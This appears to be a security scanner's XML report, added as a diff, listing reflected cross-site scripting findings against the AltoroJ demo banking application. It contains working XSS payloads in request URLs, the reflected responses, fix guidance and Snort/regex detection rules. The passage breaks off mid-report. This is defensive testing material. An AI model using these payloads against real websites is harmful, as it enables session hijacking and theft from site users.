@@ -1,0 +1,1138 @@
+<?xml version='1.0' encoding='utf-8'?>
+<CriticalIssues><Issue><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><URL>http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/search.jsp?query=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%31%34%37%38%33%29%3c%2f%73%43%72%49%70%54%3e</URL><Scheme>http</Scheme><Host>ec2-18-228-23-75.sa-east-1.compute.amazonaws.com</Host><Port>7272</Port><AttackMethod>GET</AttackMethod><AttackParam>query</AttackParam><VulnerableSession>GET /altoromutual/search.jsp?query=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%31%34%37%38%33%29%3c%2f%73%43%72%49%70%54%3e HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+User-Agent: Mozilla/5.0 (Windows NT 6.5; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Audit.Attack";SID="C191CB4EB9913423716C9BB4CF98E90C";PSID="85BF00D106B36E922F5B52A6DD5E6F66";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="query";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2531%2534%2537%2538%2533%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tht="40";
+X-RequestManager-Memo: stid="29";stmi="0";sc="1";rid="e9cead46";
+X-Request-Memo: rid="687eb31c";sc="1";thid="38";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=E961A6B6DDDB9B9651084808DE194E34
+
+</VulnerableSession><TriggerSession>GET /altoromutual/search.jsp?query=12345 HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Crawl";SID="85BF00D106B36E922F5B52A6DD5E6F66";PSID="AD78A0593898098C3340D7C6703CF6FA";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tht="31";
+X-RequestManager-Memo: stid="25";stmi="0";sc="1";rid="51ce026d";
+X-Request-Memo: rid="7eba1d4f";sc="1";thid="35";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=9BF47E8C04470A9ACF572A897CDA1350
+
+</TriggerSession><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting: Reflected</Name><ReportSection><Name>Summary</Name><SectionText>&lt;hp-img src="xss.rgc" /&gt;&lt;br /&gt;Cross-Site Scripting vulnerability found in Get parameter query.  The following attack uses plain encoding:&lt;br&gt;&lt;br&gt;&amp;lt;sCrIpT&amp;gt;alert(14783)&amp;lt;/sCrIpT&amp;gt;&lt;br&gt;&lt;br/&gt;&lt;br/&gt;A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.</SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText>&lt;br /&gt;
+Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. &lt;br /&gt;&lt;br /&gt;
+
+The implications of successful Cross-Site Scripting attacks are:
+
+&lt;ul&gt;&lt;li&gt;Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. &lt;/li&gt;&lt;li&gt;Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 
+
+&lt;/li&gt;&lt;li&gt;Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
+&lt;/li&gt;&lt;li&gt;Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.&lt;/li&gt;&lt;li&gt;	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . &lt;/li&gt;&lt;li&gt;Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. &lt;/li&gt;&lt;li&gt;	Manipulation of user settings - Attackers can change user settings for nefarious purposes. &lt;/li&gt;&lt;li&gt;Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. &lt;/li&gt;&lt;li&gt;Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.&lt;/li&gt;&lt;li&gt;Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).&lt;/li&gt;&lt;li&gt;Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. &lt;/li&gt;&lt;/ul&gt;</SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText>&lt;br /&gt;
+
+View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.
+
+
+The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 
+
+
+
+Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.</SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText>&lt;br /&gt;&lt;b&gt;For Development:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 
+
+verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 
+
+to convert it to a numeric data type in your programming language. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt; intval("0".$_GET['q']);   &lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; 
+
+int.TryParse(Request.QueryString["q"], out val); &lt;br /&gt;&lt;br /&gt;
+
+The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 
+
+text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 
+
+value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. &lt;br /&gt;&lt;br /&gt;
+
+Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 
+
+These should be used to sanitize all input before it is displayed to the client. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt;  string htmlspecialchars (string string 
+
+[, int quote_style])&lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; Server.HTMLEncode (strHTML String)
+
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 
+
+sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 
+
+all non-alphanumeric characters using hex (\xHH) encoding.&lt;br /&gt;&lt;br /&gt;
+
+If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 
+
+or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 
+
+do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:&lt;br /&gt;&lt;br /&gt;
+
+s = s.replace(/&amp;amp;/g,'&amp;amp;amp;').replace(/"/i,'&amp;amp;quot;').replace(/&amp;lt;/i,'&amp;amp;lt;').replace(/&amp;gt;/i,'&amp;amp;gt;').replace(/'/i,'&amp;amp;apos;')
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 
+
+data for display should be done immediately before displaying it.
+
+&lt;b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+For Security Operations:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 
+
+selected character set, can help to prevent Cross-Site Scripting attacks. &lt;br /&gt;&lt;br /&gt;
+
+Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 
+
+protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 
+
+EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. &lt;br /&gt;&lt;br /&gt;
+
+An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 
+
+Scripting. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Regex for a simple XSS attack:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/ix &lt;br /&gt;&lt;br /&gt;
+
+The above regular expression would be added into a new Snort rule as follows: &lt;br /&gt;&lt;br /&gt;
+
+alert tcp $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 
+
+pcre:"/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Paranoid regex for 
+
+XSS attacks:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)[^\n]+((\%3E)|&amp;gt;)/I &lt;br /&gt;&lt;br /&gt;
+
+This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 
+
+followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 
+
+server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.
+
+&lt;br /&gt;&lt;br /&gt;&lt;b&gt;For QA:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 
+
+about manually testing your application for Cross-Site Scripting.</SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText>&lt;br /&gt;&lt;br /&gt;&lt;b&gt;OWASP Cross-Site Scripting Information&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.owasp.org/index.php/XSS"&gt;https://www.owasp.org/index.php/XSS&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CERT&lt;/b&gt;&lt;br /&gt;&lt;a href="http://www.cert.org/advisories/CA-2000-02.html"&gt;http://www.cert.org/advisories/CA-2000-02.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Apache&lt;/b&gt;&lt;br /&gt;&lt;a href="http://httpd.apache.org/info/css-security/apache_specific.html"&gt;http://httpd.apache.org/info/css-security/apache_specific.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CGISecurity&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.cgisecurity.com/xss-faq.html "&gt;https://www.cgisecurity.com/xss-faq.html&lt;/a&gt;</SectionText></ReportSection><RawResponse>HTTP/1.1 200
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 7237
+Date: Fri, 27 Dec 2024 06:26:21 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+
+ 
+    
+
+ 
+
+&lt;!-- BEGIN HEADER --&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+
+&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" &gt;
+
+
+
+&lt;head&gt;
+	&lt;title&gt;Altoro Mutual&lt;/title&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;
+  &lt;link href="/altoromutual/style.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;
+&lt;body style="margin-top:5px;"&gt;
+
+&lt;div id="header" style="margin-bottom:5px; width: 99%;"&gt;
+  &lt;form id="frmSearch" method="get" action="/altoromutual/search.jsp"&gt;
+	  &lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
+		  &lt;tr&gt;
+		      &lt;td rowspan="2"&gt;&lt;a id="HyperLink1" href="/altoromutual/index.jsp"&gt;&lt;img src="/altoromutual/images/logo.gif" width=283 height=80/&gt;&lt;/a&gt;&lt;/td&gt;
+			  &lt;td align="right" valign="top"&gt;
+  			  &lt;a id="LoginLink" href="/altoromutual/login.jsp"&gt;&lt;font style="font-weight: bold; color: red;"&gt;Sign In&lt;/font&gt;&lt;/a&gt; | &lt;a id="HyperLink3" href="/altoromutual/index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt; | &lt;a id="HyperLink4" href="/altoromutual/feedback.jsp"&gt;Feedback&lt;/a&gt; | &lt;label for="txtSearch"&gt;Search&lt;/label&gt;
+          &lt;input type="text" name="query" id="query" accesskey="S" /&gt;
+          &lt;input type="submit" value="Go" /&gt;
+			  &lt;/td&gt;
+		  &lt;/tr&gt;
+		  &lt;tr&gt;
+			  &lt;td align="right" style="background-image:url('/altoromutual/images/gradient.jpg');padding:0px;margin:0px;"&gt;&lt;img src="/altoromutual/images/header_pic.jpg" alt="" width=354 height=60/&gt;&lt;/td&gt;
+		  &lt;/tr&gt;
+	  &lt;/table&gt;
+	&lt;/form&gt;
+&lt;/div&gt;
+
+&lt;table cellspacing="0" width="100%"&gt;
+  &lt;tr&gt;
+    &lt;td width="25%" class="bt br bb"&gt;&lt;div id="Header1"&gt;&lt;img id="Image1" src="/altoromutual/images/pf_lock.gif" width=12 height=14 style="vertical-align: bottom;" alt="Secure Login"/&gt; &amp;nbsp; &lt;a id="AccountLink" href="/altoromutual/login.jsp" class="focus" &gt;ONLINE BANKING LOGIN&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header2"&gt;&lt;a id="LinkHeader2" class="focus" href="/altoromutual/index.jsp?content=personal.htm" &gt;PERSONAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header3"&gt;&lt;a id="LinkHeader3" class="focus" href="/altoromutual/index.jsp?content=business.htm" &gt;SMALL BUSINESS&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt bb"&gt;&lt;div id="Header4"&gt;&lt;a id="LinkHeader4" class="focus" href="/altoromutual/index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+  
+  &lt;!-- END HEADER --&gt;
+
+
+&lt;div id="wrapper" style="width: 99%;"&gt;
+	 
+
+&lt;!-- TOC BEGIN --&gt;     
+     &lt;td valign="top" class="cc br bb"&gt;
+        &lt;br style="line-height: 10px;"/&gt;
+        
+        &lt;a id="CatLink1" class="subheader" href="index.jsp?content=personal.htm"&gt;PERSONAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink1" href="index.jsp?content=personal_deposit.htm"&gt;Deposit Product&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink2" href="index.jsp?content=personal_checking.htm"&gt;Checking&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink3" href="index.jsp?content=personal_loans.htm"&gt;Loan Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink4" href="index.jsp?content=personal_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink5" href="index.jsp?content=personal_investments.htm"&gt;Investments &amp;amp; Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink6" href="index.jsp?content=personal_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink2" class="subheader" href="index.jsp?content=business.htm"&gt;SMALL BUSINESS&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink7" href="index.jsp?content=business_deposit.htm"&gt;Deposit Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink8" href="index.jsp?content=business_lending.htm"&gt;Lending Services&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink9" href="index.jsp?content=business_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink10" href="index.jsp?content=business_insurance.htm"&gt;Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink11" href="index.jsp?content=business_retirement.htm"&gt;Retirement&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink12" href="index.jsp?content=business_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink3" class="subheader" href="index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink13" href="index.jsp?content=inside_about.htm"&gt;About Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink14" href="index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink15" href="cgi.exe"&gt;Locations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink16" href="index.jsp?content=inside_investor.htm"&gt;Investor Relations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink17" href="index.jsp?content=inside_press.htm"&gt;Press Room&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink18" href="index.jsp?content=inside_careers.htm"&gt;Careers&lt;/a&gt;&lt;/li&gt;
+			&lt;li&gt;&lt;a id="MenuHyperLink19" href="subscribe.jsp"&gt;Subscribe&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/td&gt;
+&lt;!-- TOC END --&gt;
+
+    &lt;td valign="top" colspan="3" class="bb"&gt;
+		
+	
+		
+		
+		&lt;div class="fl" style="width: 99%;"&gt;
+		
+		&lt;h1&gt;Search Results&lt;/h1&gt;
+		
+		&lt;p&gt;No results were found for the query:&lt;br /&gt;&lt;br /&gt;
+		
+		12345&lt;sCrIpT&gt;alert(14783)&lt;/sCrIpT&gt;
+		
+		&lt;/div&gt;    
+    &lt;/td&gt;	
+&lt;/div&gt;
+
+ 
+
+&lt;!-- BEGIN FOOTER --&gt;
+
+
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id="footer" style="width: 99%;"&gt;
+    &lt;a id="HyperLink5" href="/altoromutual/index.jsp?content=privacy.htm"&gt;Privacy Policy&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/index.jsp?content=security.htm"&gt;Security Statement&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/status_check.jsp"&gt;Server Status Check&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &lt;a id="HyperLink6" href="/altoromutual/swagger/index.html"&gt;REST API&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &amp;copy;&amp;nbsp;2024 Altoro Mutual, Inc.
+    &lt;span style="color:red;font-weight:bold;font-style:italic;float:right"&gt;This web application is open source!&lt;span style="color:black;font-style:italic;font-weight:normal;float:right"&gt;&amp;nbsp;&lt;a href="https://github.com/AppSecDev/AltoroJ/"&gt;Get your copy from GitHub&lt;/a&gt; and take advantage of advanced features&lt;/span&gt;&lt;/span&gt;
+	&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    &lt;div class="disclaimer"&gt;
+        The AltoroJ website is published by IBM Corporation for the sole purpose of
+        demonstrating the effectiveness of IBM products in detecting web application
+        vulnerabilities and website defects. This site is not a real banking site. Similarities,
+        if any, to third party products and/or websites are purely coincidental. This site is
+        provided "as is" without warranty of any kind, either express or implied. IBM does
+        not assume any risk in relation to your use of this website. For more information,
+        please go to &lt;a id="HyperLink7" href="http://www-142.ibm.com/software/products/us/en/subcategory/SWI10" &gt;http://www-142.ibm.com/software/products/us/en/subcategory/SWI10&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;
+
+        Copyright &amp;copy; 2008, 2024, IBM Corporation, All rights reserved.
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- END FOOTER --&gt;   </RawResponse></Issue><Issue><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><URL>http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/index.jsp?content=inside_contact.htm%3c%73%63%72%69%70%74%20%73%72%63%3d%2f%2f%32%34%36%36%36%20%69%64%3d%22</URL><Scheme>http</Scheme><Host>ec2-18-228-23-75.sa-east-1.compute.amazonaws.com</Host><Port>7272</Port><AttackMethod>GET</AttackMethod><AttackParam>content</AttackParam><VulnerableSession>GET /altoromutual/index.jsp?content=inside_contact.htm%3c%73%63%72%69%70%74%20%73%72%63%3d%2f%2f%32%34%36%36%36%20%69%64%3d%22 HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+User-Agent: Mozilla/5.0 (Windows NT 6.5; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Audit.Attack";SID="A5141B64697BF121A04105A4F6CDF309";PSID="131DE720DC760C64DC6C95841ACEDA10";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="4";AttackParamDesc="content";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="inside_contact.htm%253c%2573%2563%2572%2569%2570%2574%2520%2573%2572%2563%253d%252f%252f%2532%2534%2536%2536%2536%2520%2569%2564%253d%2522";AttackStringProps="Attack";tht="40";
+X-RequestManager-Memo: stid="45";stmi="0";sc="1";rid="74e13004";
+X-Request-Memo: rid="47e35758";sc="1";thid="46";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=2DBDD30100779C7E715974923C774EDB
+
+</VulnerableSession><TriggerSession>GET /altoromutual/index.jsp?content=inside_contact.htm HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Crawl";SID="131DE720DC760C64DC6C95841ACEDA10";PSID="AD78A0593898098C3340D7C6703CF6FA";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tht="31";
+X-RequestManager-Memo: stid="25";stmi="0";sc="1";rid="e00b6cf5";
+X-Request-Memo: rid="c2a55489";sc="1";thid="33";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=9BF47E8C04470A9ACF572A897CDA1350
+
+</TriggerSession><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting: Reflected</Name><ReportSection><Name>Summary</Name><SectionText>&lt;hp-img src="xss.rgc" /&gt;&lt;br /&gt;Cross-Site Scripting vulnerability found in Get parameter content.  The following attack uses plain encoding:&lt;br&gt;&lt;br&gt;&amp;lt;script src=//24666 id=&amp;quot;&lt;br&gt;&lt;br/&gt;&lt;br/&gt;A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.</SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText>&lt;br /&gt;
+Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. &lt;br /&gt;&lt;br /&gt;
+
+The implications of successful Cross-Site Scripting attacks are:
+
+&lt;ul&gt;&lt;li&gt;Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. &lt;/li&gt;&lt;li&gt;Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 
+
+&lt;/li&gt;&lt;li&gt;Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
+&lt;/li&gt;&lt;li&gt;Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.&lt;/li&gt;&lt;li&gt;	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . &lt;/li&gt;&lt;li&gt;Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. &lt;/li&gt;&lt;li&gt;	Manipulation of user settings - Attackers can change user settings for nefarious purposes. &lt;/li&gt;&lt;li&gt;Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. 